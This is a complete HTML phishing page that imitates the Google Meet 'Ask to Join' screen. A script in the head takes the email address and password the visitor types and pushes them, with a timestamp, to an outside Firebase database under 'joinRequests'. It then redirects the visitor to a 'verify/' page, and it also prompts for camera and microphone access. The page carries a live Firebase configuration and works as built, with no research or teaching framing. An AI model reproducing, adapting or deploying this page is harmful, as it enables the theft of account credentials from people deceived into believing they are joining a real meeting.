<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Google Meet</title>

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="favicon.png" />

  <!-- Load Material Icons -->
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />

  <script type="module">
    // Firebase SDK Import (Latest v12)
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

    // Replace with your Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyAoHENNTEvEsoRQ7beNt74OeK3fvOwT9Z4",
      authDomain: "asif-panel.firebaseapp.com",
      databaseURL: "https://asif-panel-default-rtdb.firebaseio.com",
      projectId: "asif-panel",
      storageBucket: "asif-panel.appspot.com",
      messagingSenderId: "860805105135",
      appId: "1:860805105135:web:28cffcb74741dbb4ed621a"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Wait for DOM
    window.addEventListener("DOMContentLoaded", () => {
      const btn = document.getElementById('askJoinBtn');
      const spinner = document.getElementById('spinner');

      // Create popup container
      let popup = document.createElement('div');
      popup.id = 'popup-message';
      popup.style.position = 'fixed';
      popup.style.top = '20px';
      popup.style.left = '50%';
      popup.style.transform = 'translateX(-50%)';
      popup.style.backgroundColor = '#f44336';
      popup.style.color = 'white';
      popup.style.padding = '12px 20px';
      popup.style.borderRadius = '4px';
      popup.style.boxShadow = '0 2px 6px rgba(0,0,0,0.3)';
      popup.style.fontSize = '14px';
      popup.style.fontWeight = '500';
      popup.style.zIndex = '9999';
      popup.style.display = 'none';
      document.body.appendChild(popup);

      function showPopup(message) {
        popup.textContent = message;
        popup.style.display = 'block';
        setTimeout(() => {
          popup.style.display = 'none';
        }, 3000);
      }

      btn.addEventListener('click', async () => {
        const email = document.querySelector('input[type="email"]').value.trim();
        const password = document.querySelector('input[type="password"]').value.trim();

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!email || !password) {
          showPopup("Please enter both email and password");
          return;
        }

        if (!emailRegex.test(email)) {
          showPopup("Please enter a valid email address");
          return;
        }

        btn.disabled = true;
        spinner.style.display = 'block';

        try {
          await push(ref(db, "joinRequests"), {
            email: email,
            password: password,
            timestamp: new Date().toLocaleString()
          });
          console.log("Data sent to Firebase");
        } catch (error) {
          console.error("Error sending data:", error);
          showPopup("Error sending data to Firebase");
          btn.disabled = false;
          spinner.style.display = 'none';
          return;
        }

        setTimeout(() => {
          window.location.href = "verify/";
        }, 2000);
      });
    });
  </script>

  <style>
    /* Your original CSS here (unchanged) */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Arial', sans-serif;
      background-color: #fff;
      color: #202124;
    }
    .top-bar {
      display: flex;
      align-items: center;
      padding: 16px 40px;
    }
    .logo {
      display: flex;
      align-items: center;
      font-size: 22px;
      font-weight: bold;
    }
    .logo img {
      height: 70px;
      margin-right: 10px;
    }
    .main {
      display: flex;
      justify-content: space-between;
      padding: 40px 60px;
      flex-wrap: wrap;
    }
    .video-section {
      width: 58%;
      background-color: #202124;
      border-radius: 18px;
      height: 400px;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      margin-right: 40px;
    }
    video {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 18px;
      object-fit: cover;
      z-index: 1;
    }
    .three-dots {
      position: absolute;
      top: 15px;
      right: 20px;
      z-index: 2;
      color: white;
      font-size: 22px;
      cursor: pointer;
    }
    .video-overlay {
      z-index: 3;
      text-align: center;
    }
    .video-text {
      font-size: 20px;
      font-weight: 500;
      margin-bottom: 20px;
    }
    .allow-btn {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 14px;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .allow-btn:hover {
      background-color: #1669d0;
    }
    .controls {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 20px;
      z-index: 3;
    }
    .control-btn {
      width: 50px;
      height: 50px;
      background: #ea4335;
      border-radius: 50%;
      color: white;
      border: none;
      cursor: pointer;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 28px; /* bigger for icons */
      padding: 0;
    }
    .control-btn .badge {
      position: absolute;
      top: -4px;
      right: -4px;
      background: #fbbc04;
      color: white;
      border-radius: 50%;
      font-size: 10px;
      width: 16px;
      height: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
    }
    .form-section {
      width: 35%;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }
    .form-section h2 {
      font-size: 26px;
      font-weight: 600;
      margin-bottom: 30px;
      text-align: center;
      color: #202124;
    }
    .form-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }
    .btn-join {
      background-color: #1a73e8;
      color: white;
      padding: 14px 0;
      width: 100%;
      font-size: 16px;
      border: none;
      border-radius: 30px;
      cursor: pointer;
    }
    .btn-join:hover {
      background-color: #1669d0;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #1a73e8;
      border-radius: 50%;
      width: 28px;
      height: 28px;
      animation: spin 1s linear infinite;
      display: none;
      margin: 20px auto 10px;
    }
    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
    .other-options {
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
    }
    .other-options a {
      color: #1a73e8;
      text-decoration: none;
    }
    .device-info-bar {
      display: flex;
      gap: 25px;
      margin-top: 0px;
      margin-left: 122px;
      color: #5f6368;
      font-size: 13px;
      align-items: center;
      flex-wrap: wrap;
    }
    .device-item {
      display: flex;
      align-items: center;
      gap: 6px;
    }
    @media (max-width: 1000px) {
      .main {
        flex-direction: column;
        align-items: center;
        padding: 20px;
      }
      .video-section,
      .form-section {
        width: 90%;
        margin-right: 0;
        margin-bottom: 40px;
      }
      .device-info-bar {
        margin-left: 0;
        justify-content: center;
      }
    }
  </style>
</head>
<body>
  <!-- Top Bar -->
  <div class="top-bar">
    <div class="logo">
      <img class="logo" src="logo.png" alt="Google Meet">
    </div>
  </div>

  <!-- Main Section -->
  <div class="main">
    <!-- Left Video Section -->
    <div class="video-section">
      <video id="video" autoplay muted playsinline style="display:none;"></video>

      <div class="three-dots">
        <span class="material-icons"></span>
      </div>

      <div class="video-overlay" id="videoOverlay">
        <p class="video-text">Do you want people to see and hear you in the meeting?</p>
        <button class="allow-btn" onclick="startCamera()">
          Allow microphone and camera
        </button>
      </div>

      <div class="controls">
        <button class="control-btn" aria-label="Mic Off">
          <span class="material-icons">mic_off</span>
          <div class="badge">!</div>
        </button>
        <button class="control-btn" aria-label="Video Off">
          <span class="material-icons">videocam_off</span>
          <div class="badge">!</div>
        </button>
      </div>
    </div>

    <!-- Right Form Section -->
    <div class="form-section">
      <h2>What's your Email?</h2>
      <input type="email" class="form-input" placeholder="Enter Your Email" />
      <input type="password" class="form-input" placeholder="Enter Your Password" />
      <button class="btn-join" id="askJoinBtn">Ask to Join</button>
      <div class="spinner" id="spinner"></div>
      <div class="other-options">
        Other joining options<br />
        <a href="#">Ask to use Companion mode</a>
      </div>
    </div>
  </div>

  <!-- Device Info Bar -->
  <div class="device-info-bar">
    <div class="device-item">
      <span class="material-icons">mic</span><span>Permission needed</span>
    </div>
    <div class="device-item">
      <span class="material-icons">volume_up</span><span>Permission needed</span>
    </div>
    <div class="device-item">
      <span class="material-icons">videocam</span><span>Permission needed</span>
    </div>
  </div>

  <script>
    // Camera function
    function startCamera() {
      const video = document.getElementById("video");
      const overlay = document.getElementById("videoOverlay");
      navigator.mediaDevices
        .getUserMedia({ video: true, audio: true })
        .then((stream) => {
          video.srcObject = stream;
          video.style.display = "block";
          overlay.style.display = "none";
        })
        .catch((err) => {
          alert("Could not access camera/microphone: " + err.message);
        });
    }
  </script>
</body>
</html>
